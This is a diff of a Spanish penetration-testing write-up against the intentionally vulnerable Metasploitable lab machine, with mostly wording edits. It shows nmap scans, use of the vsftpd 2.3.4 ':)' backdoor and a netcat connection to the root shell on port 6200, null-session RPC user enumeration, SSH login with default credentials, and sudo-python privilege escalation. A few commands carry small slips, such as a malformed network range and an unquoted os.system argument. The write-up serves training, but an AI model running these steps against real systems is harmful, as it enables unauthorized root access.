@@ -23,26 +23,26 @@ Para instalar la máquina virtual, presionamos el botón "Abrir una máquina vir
 A partir de este momento, podemos iniciar Metasploitable y empezar a auditarla a través de nuestra máquina atacante.
 
 # Reconocimiento
- En caso de que no sepamos cuál es la dirección IP de la máquina, podemos usar nmap para escanear la red y distinguir a nuestro objetivo con el siguiente comando (En mi caso la red es 192.168.0/24):
+ En caso de que no sepamos cuál es la dirección IP de la máquina, podemos usar nmap para escanear la red y distinguir a nuestro objetivo con el siguiente comando (para el ejemplo la red será 192.168.0/24):
  ```bash
 nmap -sn 192.168.0/24
 ```
-Ahora que conocemos la IP de la máquina, podemos iniciar a escanear los puertos con nmap (recomiendo el siguiente comando facilitar los futuros procesos):
+Ahora que conocemos la IP de la máquina, podemos iniciar a escanear los puertos con nmap (recomiendo el siguiente comando para facilitar futuros procesos):
 ```bash
 nmap -p- IP -oN openPorts.txt
 ```
 
 ![4](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/4.png)
 
-Como podemos ver, hay una gran cantidad de puertos y servicios activos en Metasploitable; por esta razón, es una excelente máquina para practicar. 
+Como podemos ver, hay una gran cantidad de puertos y servicios activos en Metasploitable; por esta razón es una excelente máquina para practicar. 
 
 Ya que sabemos qué puertos están abiertos, vamos a hacer un escaneo exhaustivo para ver exactamente qué servicios (y qué versión de estos) están corriendo y si tienen alguna vulnerabilidad conocida.
 
-> Con el siguiente script podemos copiar de forma automática a nuestro portapapeles, todos los puertos abiertos de la máquina guardados en el archivo openPorts.txt, para el escaneo exhaustivo que haremos posteriormente en nmap:
+> Con el siguiente script podemos copiar de forma automática a nuestro portapapeles todos los puertos abiertos de la máquina, guardados en el archivo openPorts.txt para el escaneo exhaustivo que haremos posteriormente con nmap:
 ```bash
 cat openPorts.txt | grep -E "[1-9]" | head -n -2 | tail -n +5 | awk -F/ '{print $1}' | paste -sd, | xclip -selection clipboard
 ```
-Ahora procedemos a realizar el escaneo exhaustivo con el siguiente comando:
+Ahora procedemos a realizar el segundo escaneo con el siguiente comando:
 ```bash
 nmap -p 21,22,23,25,53,80,111,139,445,512,513,514,1099,1524,2049,2121,3306,3632,5432,5900,6000,6667,6697,8009,8180,8787,32966,33785,34219,42886 -sCV -Pn 192.168.5.143 -oN nmap.txt
 ```
@@ -68,17 +68,17 @@ PORT      STATE SERVICE     VERSION
 |      vsFTPd 2.3.4 - secure, fast, stable
 |_End of status
 ```
-La salida anterior nos deja saber que el FTP en ejecución es vsftpd 2.3.4. Esta versión fue publicada con un backdoor, el cual permite obtener una shell dentro del sistema simplemente iniciando sesión con un nombre de usuario al que se le incluyan los caracteres ":)" al final.
+La salida anterior nos deja saber que el FTP en ejecución es vsftpd 2.3.4. Esta versión fue publicada con un backdoor que permite obtener una shell inversa en el sistema simplemente iniciando sesión con un nombre de usuario que termine con los caracteres ":)".
 
-Como mencioné en la introducción, todos los ataques redactados aquí se realizarán de forma manual. Esto es con el propósito de realmente entender las vulnerabilidades presentadas, y aprender a explotarlas. A continuación, vamos a ver cómo conectarnos a este backdoor paso a paso.
+Como mencioné en la introducción, todos los ataques redactados aquí se realizarán de forma manual. Esto es con el propósito de realmente entender las vulnerabilidades presentadas y aprender a explotarlas. A continuación, vamos a ver cómo conectarnos a este backdoor paso a paso.
 
-Nos conectamos a la instancia de FTP del objetivo con cualquier nombre de usuario, pero es obligatorio que termine con ":)", y como contraseña ponemos cualquier cosa, o incluso nada.
+Nos conectamos a la instancia de FTP del objetivo con cualquier nombre de usuario, pero es crucial que termine con ":)", y como contraseña ponemos cualquier cosa, o incluso nada.
 ```bash
 ftp IP
 ```
 ![5](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/5.png)
 
-Al iniciar sesión, notamos que la conexión se "paraliza". Esto es porque el backdoor abrió una shell en el puerto 6200 del sistema víctima y está esperando por conexiones. Al conectarnos a la shell, ingresamos al sistema como root. Esto es porque el servicio FTP se ejecutaba con permisos del usuario administrador:
+Al iniciar sesión, notamos que la conexión se "paraliza". Esto es porque el backdoor abrió una shell en el puerto 6200 del sistema víctima y está esperando conexiones. Al conectarnos a la shell, ingresamos al sistema como root. Esto es porque el servicio FTP se ejecutaba con permisos del usuario administrador:
 ```bash
 nc IP 6200
 ```
@@ -114,15 +114,16 @@ PORT      STATE SERVICE     VERSION
 |_  100024  1          42886/tcp   status
 
 ```
-Para enumerar usuarios a través de RPC utilizaremos el comando **rpcclient**. Vamos a intentar acceder como invitado (sin credenciales) con el siguiente comando:
+Para conectarnos a RPC utilizaremos el comando **rpcclient**. Vamos a intentar acceder como invitado (sin credenciales) con el siguiente comando:
 ```bash
 rpcclient -U "" -N IP
 ```
-Luego de loguearnos como invitado en RPC, ejecutando el comando `enumdomusers` podremos ver los usuarios del sistema objetivo:
+Luego de loguearnos como invitado, ejecutando el comando `enumdomusers` podremos enumerar los usuarios existentes en el sistema objetivo:
 ```bash
 rpcclient -U "" -N 192.168.5.143
 
 rpcclient $> enumdomusers
+
 user:[games] rid:[0x3f2]
 user:[nobody] rid:[0x1f5]
 user:[bind] rid:[0x4ba]
@@ -159,7 +160,7 @@ user:[tomcat55] rid:[0x4c4]
 user:[sync] rid:[0x3f0]
 user:[uucp] rid:[0x3fc]
 ```
-Verdaderamente son muchos usuarios, pero entre todos estos existe uno que tiene como contraseña el mismo nombre, este es **msfadmin**.
+Verdaderamente son muchos usuarios, pero entre todos estos existe uno que tiene como contraseña su mismo nombre; este es **msfadmin**.
 
 Ya que tenemos el conjunto de credenciales, podemos conectarnos al sistema a través de SSH:
 
@@ -176,13 +177,13 @@ Al ejecutar el comando `id` podemos ver que no somos el usuario root, por lo que
 
 ![8](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/8.png)
 
-Aunque se puede lograr la escalada de privilegios de formas más sencillas, para este ejemplo usaré Python como vector de PrivEsc. Para esto. Ejecutamos una instancia de Python privilegiada con el comando: `sudo /usr/bin/python`.
+Aunque se puede lograr la escalada de privilegios de formas más sencillas, para este ejemplo usaré Python como vector de PrivEsc. Para esto, ejecutamos una instancia de Python privilegiada con el comando: `sudo /usr/bin/python`.
 
 Dentro de Python importamos la biblioteca `os`, y por último llamamos una terminal con el comando `os.system(/bin/bash)`:
 
 ![9](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/9.png)
 
-Y de esta forma habremos hecho nuestro el sistema de Metasploitable a través de **SSH**.
+Y de esta forma habremos hecho nuestro el sistema de Metasploitable a través de **SSH** auxiliándonos de **RPC**.
 
 # NFS
 ```bash
